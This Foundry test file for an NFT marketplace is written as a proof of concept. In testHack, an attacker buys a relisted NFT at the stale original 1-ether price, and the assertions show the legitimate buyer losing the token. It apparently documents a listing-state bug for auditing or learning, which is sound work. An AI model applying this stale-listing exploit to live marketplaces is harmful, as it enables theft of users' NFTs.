// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Market.sol";
import "../src/NFT.sol";

import {console} from "forge-std/console.sol";

contract MarketTest is Test {
    NFTMarket marketplace;
    NFT nft;
    address deployer = 0x7964f4Fb6616e41E0F0Bed6fa449188DFf9F7E61;
    address seller = 0xE6043c98e06043869781E0638C43aFDb4Ce4cd5C;
    address buyer = 0x7964cA33D36eCf5E7a73d0FDAf82a4420eBaF819;
    address hacker = 0x4eB9773CAd5C3A4F2bC92648BF2780a4582D6a17;
    function setUp() public {
        vm.startPrank(deployer);
        marketplace = new NFTMarket();
        nft = new NFT(address(marketplace));
        vm.stopPrank();
        vm.prank(seller);
        nft.createToken("FirstToken");

        vm.deal(seller, 10 ether);
        vm.deal(buyer, 10 ether);
        vm.deal(hacker, 10 ether);
    }


    function testHack() public {
        // Start seller has 1 NFT - 10 ether
        //       buyer has 10 ether
        //       hacker has 10 ether
        
        // Minter-Seller lists its nft for 1 ether
        vm.prank(seller);
        marketplace.createMarketItem{value:0 ether}(address(nft), 1, 1 ether);


        // buyer buys the nft for 1 ether & lists it for 10 ether
       
        vm.startPrank(buyer);
        marketplace.createMarketSale{value:1 ether}(address(nft), 1);
        nft.approve(address(marketplace), 1);
        marketplace.createMarketItem{value:0 ether}(address(nft), 1, 10 ether);
        vm.stopPrank();


        // hacker is able to buy the nft for 1 eth using the old listing data.
        // Buyer loses its nft
        
        vm.startPrank(hacker);
        marketplace.createMarketSale{value:1 ether}(address(nft), 1);
        
        assertEq(seller.balance, 12 ether);
        assertEq(buyer.balance, 9 ether);
        assertEq(hacker.balance, 9 ether);
        assertEq(nft.balanceOf(hacker), 1);

        // End (hacked) seller has 12 ether
        //              buyer has 9 ether
        //              hacker has 9 ether & 1 NFT


        // Expeceted    seller has 11 ether
        //              buyer has 19 ether
        //              NotHacker has 0 ether & 1 NFT
    }
}
